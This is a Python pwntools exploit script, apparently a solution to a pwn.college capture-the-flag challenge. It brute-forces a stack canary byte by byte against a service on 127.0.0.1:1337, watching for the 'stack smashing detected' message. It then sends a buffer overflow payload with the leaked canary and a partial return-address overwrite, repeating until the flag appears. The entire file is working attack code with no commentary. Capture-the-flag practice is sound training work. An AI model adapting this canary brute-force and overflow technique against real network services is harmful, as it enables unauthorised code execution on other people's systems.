#!/usr/bin/python3

from pwn import *
import time
import re
from binascii import unhexlify

context.log_level = 'error'
context.arch = "amd64"

#elf = context.binary = ELF('/challenge/latent-leak-hard')

base_pointer = 0x7ffc637f8430
input_start = base_pointer - 0x50
canary_add = base_pointer - 8
ret_add = base_pointer + 8
space_to_canary = canary_add - input_start
remainig_till_flag = ret_add - canary_add - 8

payload = b"a" * space_to_canary

for _ in range(24):
    for i in range(256):
        io = remote("127.0.0.1", 1337)
        payload += i.to_bytes(1, "little")

        try:
            io.sendline(str(len(payload)).encode())
            io.sendline(payload)

            data = io.recvuntil(b"Goodbye!\n", timeout=2)
            check = io.recvline(timeout=1)

            output = data + check
            if b"*** stack smashing detected ***" not in output:
                print("Payload:", repr(payload))
                io.close()
                break

        except EOFError:
            print(f"Connection closed: {payload!r}")
            output = io.clean(timeout=0.2)

            if b"*** stack smashing detected ***" in output:
                print("Stack smashing detected!")

        finally:
            io.close()
        payload = payload[:-1]

canary = int.from_bytes(payload[space_to_canary:space_to_canary+8],"little")

print(hex(canary))
time.sleep(10)
payload = b"a" * (space_to_canary) + p64(canary) + b"a" * 8 + b"\x1a\x7d"

while 1:
    io = remote("127.0.0.1",1337)
    try:
        io.sendline(str(len(payload)).encode())
        io.sendline(payload)
        data = io.recvall()
        print(data.decode())
        if b"pwn.college" in  data:
            print(data)
            break
    except:
        print("eof")
    finally:
        io.close()

